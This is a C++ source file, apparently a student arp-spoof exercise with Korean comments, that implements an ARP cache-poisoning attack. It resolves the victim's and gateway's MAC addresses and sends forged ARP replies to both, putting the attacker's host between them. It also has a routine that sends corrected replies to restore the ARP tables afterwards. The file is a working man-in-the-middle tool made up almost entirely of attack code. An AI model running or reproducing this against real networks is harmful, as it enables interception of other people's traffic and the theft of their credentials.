#include "ArpFlow.h"
#include <iostream>
#include <thread>


ArpFlow::ArpFlow(PcapDevice *pcap, Ip sender_ip, Ip target_ip)
    : pcap_(pcap), senderIp_(sender_ip), targetIp_(target_ip) {
    myMac_ = Mac(pcap_->getMacAddress());
    myIp_ = Ip::getMyIp(pcap_->getInterfaceName());
}

void ArpFlow::resolveMacs() {
    std::cout << "[INFO] Resolving Sender MAC (" << senderIp_.toString() << ")..." << std::endl;
    senderMac_ = queryMac(senderIp_);
    if (senderMac_ == Mac::nullMac()) throw std::runtime_error("Failed to resolve Sender MAC");

    std::cout << "[INFO] Resolving Target MAC (" << targetIp_.toString() << ")..." << std::endl;
    targetMac_ = queryMac(targetIp_);
    if (targetMac_ == Mac::nullMac()) throw std::runtime_error("Failed to resolve Target MAC");
    std::cout << "[INFO] Resolved! Sender: " << senderMac_.toString()
              << ", Target: " << targetMac_.toString() << std::endl;
}

void ArpFlow::sendArpPacket(Mac dmac, Mac smac, uint16_t op, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip) {
#pragma pack(push, 1)
    struct {
        EthHdr eth;
        ArpHdr arp;
    } packet;
#pragma pack(pop)

    packet.eth.dmac_ = dmac;
    packet.eth.smac_ = smac;
    packet.eth.type_ = htons(EthHdr::Arp);

    packet.arp.hrd_ = htons(ArpHdr::ETHER);
    packet.arp.pro_ = htons(EthHdr::Ip4);
    packet.arp.hln_ = Mac::SIZE;
    packet.arp.pln_ = Ip::SIZE;
    packet.arp.op_  = htons(op);

    packet.arp.smac_ = arp_smac;
    packet.arp.sip_ = htonl(arp_sip);
    packet.arp.tmac_ = arp_tmac;
    packet.arp.tip_ = htonl(arp_tip);

    pcap_->sendPacket((const uint8_t*)&packet, sizeof(packet));
}

Mac ArpFlow::queryMac(Ip ip) {
    sendArpPacket(Mac::broadcastMac(), myMac_, ArpHdr::Request, myMac_, myIp_, Mac::nullMac(), ip);
    pcap_t *handle = pcap_->getHandle();
    struct pcap_pkthdr *header;
    const uint8_t *pkt_data;
    for (int i = 0; i < 20; i++) { // 최대 20번 시도
        int res = pcap_next_ex(handle, &header, &pkt_data);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

        EthHdr* eth = (EthHdr*)pkt_data;
        if (eth->type() != EthHdr::Arp) continue;

        ArpHdr* arp = (ArpHdr*)(pkt_data + sizeof(EthHdr));
        if (arp->op() == ArpHdr::Reply && arp->sip_ == ip) {
            return arp->smac_;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    return Mac::nullMac();
}

void ArpFlow::sendInfectionPacket() {
    // 라우터인척 sender를 감염
    sendArpPacket(senderMac_, myMac_, ArpHdr::Reply, myMac_, targetIp_, senderMac_, senderIp_);

    // sender인척 target을 감염
    sendArpPacket(targetMac_, myMac_, ArpHdr::Reply, myMac_, senderIp_, targetMac_, targetIp_);
}

bool ArpFlow::checkRecoverPacket(EthHdr *eth, ArpHdr *arp) {
    // arp 패킷인지 확인
    if (eth->type() != EthHdr::Arp) return false;

    Ip sip = arp->sip_;
    // Mac tmac = arp->tmac_;

    if (sip == senderIp_ || sip == targetIp_) {
        return true;
    }
    return false;
}



void ArpFlow::recover() {
    // ARP는 신뢰성 없는 프로토콜이므로 확실한 복구를 위해 여러 번 전송
    for (int i = 0; i < 3; i++) {
        // 1. Sender에게 진실을 알림: "Gateway(Target)의 진짜 주소는 TargetMac이다"
        // (감염 때는 Source를 MyMac으로 속였었음)
        sendArpPacket(
            senderMac_,         // Dst Eth: Sender
            targetMac_,         // Src Eth: Target (진짜 주소!)
            ArpHdr::Reply,
            targetMac_,         // ARP Sender Mac: Target (진짜!)
            targetIp_,          // ARP Sender IP: Target
            senderMac_,         // ARP Target Mac: Sender
            senderIp_           // ARP Target IP: Sender
        );

        // 2. Target(Gateway)에게 진실을 알림: "Sender의 진짜 주소는 SenderMac이다"
        sendArpPacket(
            targetMac_,         // Dst Eth: Target
            senderMac_,         // Src Eth: Sender (진짜 주소!)
            ArpHdr::Reply,
            senderMac_,         // ARP Sender Mac: Sender (진짜!)
            senderIp_,          // ARP Sender IP: Sender
            targetMac_,         // ARP Target Mac: Target
            targetIp_           // ARP Target IP: Target
        );

        // 너무 빨리 쏘면 씹힐 수 있으므로 미세한 딜레이 (선택사항)
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
    std::cout << "[Info] ARP Tables recovered." << std::endl;
}



